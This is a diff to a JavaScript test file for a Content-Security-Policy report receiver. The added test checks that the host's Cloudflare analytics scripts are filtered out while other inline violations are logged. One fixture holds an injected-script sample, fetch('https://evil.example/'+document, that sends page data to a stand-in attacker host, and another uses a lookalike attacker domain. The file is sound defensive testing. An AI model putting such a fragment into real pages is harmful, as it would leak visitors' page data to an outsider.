@@ -1,7 +1,7 @@
 // What a browser reports is cut down before it is logged: no query strings, no page text.
 import assert from "node:assert/strict";
 import { test } from "node:test";
-import { REPORTS_PATH, bare, receive, summary } from "../src/reports.js";
+import { REPORTS_PATH, bare, expected, receive, summary } from "../src/reports.js";
 
 const post = (body, type = "application/reports+json") =>
 	new Request(`https://recall.example${REPORTS_PATH}`, { method: "POST", headers: { "content-type": type }, body });
@@ -59,4 +59,17 @@ test("receive logs one line per report, at most ten, and always answers 204", as
 	assert.equal(lines.length, 10);
 	const get = await receive(new Request(`https://recall.example${REPORTS_PATH}`), (line) => lines.push(line));
 	assert.equal(get.status, 405);
+});
+
+test("the scripts the host adds to every page are not logged, anything else inline is", async () => {
+	const beacon = { type: "csp-violation", body: { effectiveDirective: "script-src-elem", blockedURL: "https://static.cloudflareinsights.com/beacon.min.js/v1" } };
+	const snippet = { type: "csp-violation", body: { effectiveDirective: "script-src-elem", blockedURL: "inline", sample: "window.__CF$cv$params={r:'a6182c413f517a" } };
+	const other = { type: "csp-violation", body: { effectiveDirective: "script-src-elem", blockedURL: "inline", sample: "fetch('https://evil.example/'+document" } };
+	assert.ok(expected(summary(beacon)) && expected(summary(snippet)));
+	assert.ok(!expected(summary(other)));
+	assert.ok(!expected(summary({ type: "csp-violation", body: { blockedURL: "https://static.cloudflareinsights.com.evil.example/x.js" } })));
+	const lines = [];
+	await receive(post(JSON.stringify([beacon, snippet, other])), (line) => lines.push(line));
+	assert.equal(lines.length, 1);
+	assert.match(lines[0], /evil\.example/);
 });
